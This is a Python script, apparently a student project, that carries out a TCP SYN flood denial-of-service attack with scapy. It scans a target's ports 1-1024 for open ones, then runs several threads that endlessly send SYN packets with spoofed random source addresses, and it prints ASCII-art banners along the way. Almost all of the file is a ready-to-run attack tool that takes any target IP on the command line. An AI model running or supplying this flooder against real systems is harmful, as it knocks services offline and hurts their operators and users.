#
'''
2017UCP1478
TCP SYN FLOOD ATTACK

TCP SYN flood (a.k.a. SYN flood) is a type of Distributed Denial of Service (DDoS) attack that exploits 
part of the normal TCP three-way handshake to consume resources on the targeted server and render it unresponsive.

Essentially, with SYN flood DDoS, the offender sends TCP connection requests faster than the targeted machine can process them, causing network saturation.

__________________________________________________________________

Step 1 : Find all open ports of the target
Step 2 : Create a TCP handshake packet send it to target
Step 3 : Do the above process indefintly and with multiple threads

__________________________________________________________________
'''

#____ IMPORTS ____
from scapy.all import *
import os
import sys
import random
import argparse
import socket
import platform
global pcount
pcount=0
class thread(threading.Thread):
    '''
        Runs an infinte process of sending packets in parallel to other threads
    '''
    def __init__(self, tid, tarIP, tarPorts):
        threading.Thread.__init__(self)
        self.id = tid
        self.tar = tarIP
        self.tarPorts = tarPorts

    def run(self):
        print(f"Thread {self.id} Started")
        SYN_FLOOD(self.tar,self.tarPorts)
        threadLock.release()

def find_open_ports(dstIP):
    #TODO
    #Add multithreading
    ports = []
    try:
        for port in range(1,1025):  
            print(f'Scanning port : {port} ','\r',end='')
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((dstIP, port))
            
            if result == 0:
                ports.append(port)
                print(f'Open port found : {port}')
            sock.close()

    except socket.gaierror:
        print('Hostname could not be resolved. Exiting')
        sys.exit()

    except socket.error:
        print("Couldn't connect to server")
        sys.exit()
    except KeyboardInterrupt:
        print("Interrupt Detected")
        
    return ports

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1000,9000)
	return x	

def SYN_FLOOD(tarIP,tarPorts):  
    '''
        Create packets and send to target
    ''' 
    global pcount
    while(True):
        for dstPort in tarPorts:   
            s_port = randInt()
            s_eq = randInt()
            w_indow = randInt()

            IP_Packet = IP ()
            IP_Packet.src = randomIP()
            IP_Packet.dst = tarIP

            TCP_Packet = TCP ()	
            TCP_Packet.sport = s_port      	# source port 
            TCP_Packet.dport = dstPort		# destination port
            TCP_Packet.flags = "S"
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow
            send(IP_Packet/TCP_Packet, verbose=0)
            pcount+=1
            print(f'Total packets sent -> {pcount}         Sent from {IP_Packet.src}:{TCP_Packet.sport} to             {IP_Packet.dst}:{dstPort}        \r',end='')    

def main():
    parser = argparse.ArgumentParser(description = "TCP Syn-FLOOD Attacker")        
    parser.add_argument('-t','-IP','--target',required=True,help="Target IP address")   
    parser.add_argument('-p','--ports',nargs='*',type=int,help="Port/ports to be targeted") 
    parser.add_argument('-nt','--threads',type=int,default=4,help="Number of threads to be executed (4 by default)")
    print()
    args = parser.parse_args()
    print(args)

    tarIP = args.target
    
    no_threads = args.threads
    ports = args.ports  
    if not ports:
        print('Looking for open ports..')
        ports = find_open_ports(tarIP)
        print("Open Ports found : ",' '.join(str(p) for p in ports))
    if ports==[]:
        exit(print('No Open Ports Found!!'))
    
    if(input('Continue?(Y/n) : ') in "nN"):
        return 
    threads = ['']*no_threads
    for i in range(no_threads):
        threads[i] = thread(i+1,tarIP,ports)
        threads[i].start()

if __name__=="__main__":
    if platform.system()=='Linux':
        os.system('clear')
    elif platform.system()=='Windows':
        os.system('cls')    
    else:
        os.system('cls')

    if(randInt()<7000):
        print('''
        ,----,                                                                                                                                                                                  
      ,/   .`|          ,-.----.                                                             ,--.                                                                                               
    ,`   .'  : ,----..  \    /  \                              .--.--.                     ,--.'|           ,---,           ___      ___                                ,-.                     
  ;    ;     //   /   \ |   :    \                            /  /    '.       ,---,   ,--,:  : |          '  .' \        ,--.'|_  ,--.'|_                          ,--/ /|                     
.'___,/    ,'|   :     :|   |  .\ :            ,---,.        |  :  /`. /      /_ ./|,`--.'`|  ' :         /  ;    '.      |  | :,' |  | :,'                       ,--. :/ |             __  ,-. 
|    :     | .   |  ;. /.   :  |: |          ,'  .' |        ;  |  |--` ,---, |  ' :|   :  :  | |        :  :       \     :  : ' : :  : ' :                       :  : ' /            ,' ,'/ /| 
;    |.';  ; .   ; /--` |   |   \ :        ,---.'   ,        |  :  ;_  /___/ \.  : |:   |   \ | :        :  |   /\   \  .;__,'  /.;__,'  /    ,--.--.      ,---.  |  '  /      ,---.  '  | |' | 
`----'  |  | ;   | ;    |   : .   /        |   |    |         \  \    `..  \  \ ,' '|   : '  '; |        |  :  ' ;.   : |  |   | |  |   |    /       \    /     \ '  |  :     /     \ |  |   ,' 
    '   :  ; |   : |    ;   | |`-'         :   :  .'           `----.   \\  ;  `  ,''   ' ;.    ;        |  |  ;/  \   \:__,'| : :__,'| :   .--.  .-. |  /    / ' |  |   \   /    /  |'  :  /   
    |   |  ' .   | '___ |   | ;            :   |.'             __ \  \  | \  \    ' |   | | \   |        '  :  | \  \ ,'  '  : |__ '  : |__  \__\/: . . .    ' /  '  : |. \ .    ' / ||  | '    
    '   :  | '   ; : .'|:   ' |            `---'              /  /`--'  /  '  \   | '   : |  ; .'        |  |  '  '--'    |  | '.'||  | '.'| ," .--.; | '   ; :__ |  | ' \ \'   ;   /|;  : |    
    ;   |.'  '   | '/  ::   : :                              '--'.     /    \  ;  ; |   | '`--'          |  :  :          ;  :    ;;  :    ;/  /  ,.  | '   | '.'|'  : |--' '   |  / ||  , ;    
    '---'    |   :    / |   | :                                `--'---'      :  \  \'   : |              |  | ,'          |  ,   / |  ,   /;  :   .'   \|   :    :;  |,'    |   :    | ---'     
              \   \ .'  `---'.|                                               \  ' ;;   |.'              `--''             ---`-'   ---`-' |  ,     .-./ \   \  / '--'       \   \  /           
               `---`      `---`                                                `--` '---'                                                   `--`---'      `----'              `----'            
                                                                                                                                                                                                


''')    
    else:   
        print('''
s....oNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmddhhhhhhhdddmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNd-....s
o    /MMMMMMMMMMMMMMMMMMMMMMMMMMNdhso/:-.```              ``.-:/oshdNMMMMMMMMMMMMMMMMMMMMMMMMm`    o
o    /MMMMMMMMMMMMMMMMMMMMNds+:.`                                   `.:+sdNMMMMMMMMMMMMMMMMMMm`    o
o    /MMMMMMMMMMMMMMMMmy/-`                                               `-+ymMMMMMMMMMMMMMMm`    o
s    /MMMMMMMMMMMMNy+.`                                                       `-ohNMMMMMMMMMMm`    +
s    :NMMMMMMMMNy/`                                                               `/hMMMMMMMMN.    +
y    :NMMMMMMmo.                                                                     -smMMMMMN.    +
y    :NMMMMd/`                                                                         .omMMMN.    +
y    :NMMm+`                                                                             .sNMm`    +
y    -NMs.                                                                                 -dh     /
y    -m/                                                                                    `-     /
y    .-                                                                                            /
y                                                                                                  /
y                                                                                                  /
y     --`                                                                                  `--     /
y    .mNmh/`              ``.....`                                 ``.....`              .omNh`    /
y    .NMMMMd:        `-+shmmmNNNmdy+-`                         `:+ydmmmNNmmdy+:.        omMMMm`    /
y    .dNMMMMm`   .:+hmNMNNNNMMMMMMMMNdo-`                   `:smNMMMMMMMNNNNMMNmh+-`   :MMMNNh`    /
y     .-/odMd  :ymNMNmy+-..-:ohNMMMMMMMNh+-`             `-odNMMMMMMMms:-.--/odNMMNh:  sMmo+:.     /
y    `shddNMm.:NNmho:.        `:yNMMMMMMMMNhs/-      `-/sdNMMMMMMMNh/.        `-/ymNd. dMMNNmh`    /
y    .mNMMMMMo./:.               .odMMMMMMMMMMm-     sNMMMMMMMMMms-`              `-- `mNNNNNd`    /
y     -::/oyNo                     `/yNMMMMMMMN-     hMMMMMMMNd+.                     -Nho+/:.     /
y    `/ohmmms.                        -sdNMMMNo      :dMMMNmy:`                       `/ymNmds`    /
y    .NNms:`    `/+`          `````     `-+oo-        .+s+:.      `````         `++`     .+hNh`    /
y    `+:`      .hd.       .:oyhddddho-`                       `:oydddddho:`      .dd.      `-.     /
y              +N:      -ymMMMMMMMMMMNd/`                   .omMMMMMMMMMMMd+`     :N+              /
y`             +d`     -mMMMMMMMMMMMMMMMs`    ``     `     /mMMMMMMMMMMMMMMMs     .m/              /
y`             `/`     sMMMMMMMMMMMMMMMMm-    -:     /`   `hNMMMMMMMMMMMMMMMN`    `+`              /
y                   `:ymNmddhhddmNNMMMmo.     +s     +/    `/hMMMMNmdhyyyyyhdo-`                   /
y                  -ss+:.`      `.-/sd+`      y/     /d     .+mdo/.`        `.:/.                  /
y                                    `:/`   .oh`     `y+.  /y+.                                    /
y`                                        -sy/`        :yy:`                                       /
y`             `:s:                     -ss-             .os-                    .s/`              /
y            `+dMh`                    -h-                 .s`                    +Mms-            /
y          `+mMMN-                     /s                   +`                    `hMMNs.          /
y         `hMMMMm`                     ./                   /`                     oMMMMm:         +
y        .dMMMMMN-                 `.:+ssss+.          `/syhyys/.`                 yMMMMMN:        /
y        hMMMMMMMN+`           `-+hmMMMMMMMMN+        +NMMMMMMMMMNh+-`           .yMMMMMMMm`       /
y       .NMMMMMMMMMms/.````.:odNMMMMMMMMMMMMMMd+:::/sdMMMMMMMMMMMMMMMNho/.````./yNMMMMMMMMN-       /
y       .NMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMN-       /
y       `mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm`       /
y`   `   +MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM/        /
y`   :h: `hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo  /y`    /
y    :NMh.`hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN/ .yMd`    /
y    :NMMN/`/hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNms. :mMMm.    /
y    :NMMMNs` `-:+osyhdddmmmmmmmddddhys+/+shmNMMMMMMMMMMNy+++osyhhddmmmmmmmdddhhys+:.`  .mMMMN.    /
y    :NMMMMMy         `````````.shhddmmmhs+/::-----::--:-:/ohdmddddds.````````         -mMMMMN.    /
y    :NMMMMMMo                  :dMMMMMMMMMMNNNmmmmmmmmNNNMMMMMMMMNs.                 `dMMMMMN.    /
y    :NMMMMMMN-                  `+dMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy-                   sMMMMMMN.    /
y    :NMMMMMMMy                    `:smMMMMMMMMMMMMMMMMMMMMMMNh+.                    -NMMMMMMN.    /
y    :NMMMMMMMm.                      `-+shmNMMMMMMMMMMMNmds/.`                      +MMMMMMMN.    /
y    :NMMMMMMMN:                          ``.-:/+ooo++/:..`                          hMMMMMMMN.    /
y    :NMMMMMMMMs                                                                    -NMMMMMMMN.    /
y    :NMMMMMMMMm.                                                                   sMMMMMMMMN.    /
y    :NMMMMMMMMMy`                                                                 :NMMMMMMMMN.    /
y    :NMMMMMMMMMMo`                                                               -mMMMMMMMMMN.    /
y`   :NMMMMMMMMMMMs`                                                             -mMMMMMMMMMMN.    /
y`   :NMMMMMMMMMMMMh-                                                           /mMMMMMMMMMMMN.    /
y    :NMMMMMMMMMMMMMm+`                                                       .sNMMMMMMMMMMMMN.    /
y    :NMMMMMMMMMMMMMMMd/`                                                   .+mMMMMMMMMMMMMMMN.    /
y    :NMMMMMMMMMMMMMMMMMd/.                                               -smMMMMMMMMMMMMMMMMN.    /
y    :NMMMMMMMMMMMMMMMMMMMmo-                                          `:yNMMMMMMMMMMMMMMMMMMN.    /
y    :NMMMMMMMMMMMMMMMMMMMMMNy:`                                     `/hNMMMMMMMMMMMMMMMMMMMMN.    /
y    :NMMMMMMMMMMMMMMMMMMMMMMMNy-                                  `+mMMMMMMMMMMMMMMMMMMMMMMMN.    /
y    :NMMMMMMMMMMMMMMMMMMMMMMMMMm-            `.----.`            `sMMMMMMMMMMMMMMMMMMMMMMMMMN.    /
y::::oMMMMMMMMMMMMMMMMMMMMMMMMMMMm/---------/ymNNNNNNdo:---------:sMMMMMMMMMMMMMMMMMMMMMMMMMMN/::::o
dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm
dMMMMMMMNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy//yMMMMMMMMMMMMMMMMMMNNNMMMMMMMMMMMMMMMMMMMMMN
dMMMMMNy-.---/NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+``+MMMMMMMMMMMMMMMMMm-.-NMMMMMMMMMMMMMMMMMMMMN
dMMMMMs  :hhdmMMMNysssssymMMNhssssymMMMMmyssssyNMMmyso++sMMMMMMdysssshMMMdo`  ooosNMNysyNMyssdMMMMMN
dMMMMNo  /NNNNMMh: `::::/dMm/` -:  .yMNo- .:` `/NMd//.  -MMMMNo. -:` `oMMs:   :::/mMd`  mN`  sMMMMMN
dMMMN/`  `...:NM/` :hddmMMMm` `mN`  yMN-  oMhsshMMMMM/  +MMMMN.  sh.  /MMMd` `NMMMMMm`  mm`  sMMMMMN
dMMMMm/  :dddmMMNh-... `+NMh` `mN`  yMN-  oMMMMMMMMMM/  oMMMMN.  ````.:NMMd` `NMMMMMm`  mm`  sMMMMMN
dMMMMM+  /MMMMMMMNNNNh  `mMy  `dm`  yMN-  oNo:/oMMMNN/  +NNMMN.  ymmNNMMMMd` `mNNNMMm` `md`  sMMMMMN
dMMMMM+  /MMMMMMs....` `oNMms.`.` `:dMMy/``.` .sNMs..`  `..yMNs- `...yMMMMNy.`....dMms.```  /hMMMMMN
dMMMMMNmmNMMMMMMNmmmmmmmMMMMMmmmmmmNMMMMNmmmmmmMMMNmmmmmmmmNMMMmmmmmmNMMMMMMmmmmmmNMMMmy/  -mMMMMMMm
dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh///. `+NMMMMMMMm
dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdyyysshMMMMMMMMMm            
        ''')


    main()
print('''
Author : 
  , ; ,   .-'"""'-.   , ; ,
  \\|/  .'         '.  \|//
   \-;-/   ()   ()   \-;-/
   // ;               ; \\
  //__; :.         .; ;__\\
 `-----\'.'-.....-'.'/-----'
        '.'.-.-,_.'.'
          '(  (..-'
            '-'              BAMAL
''')    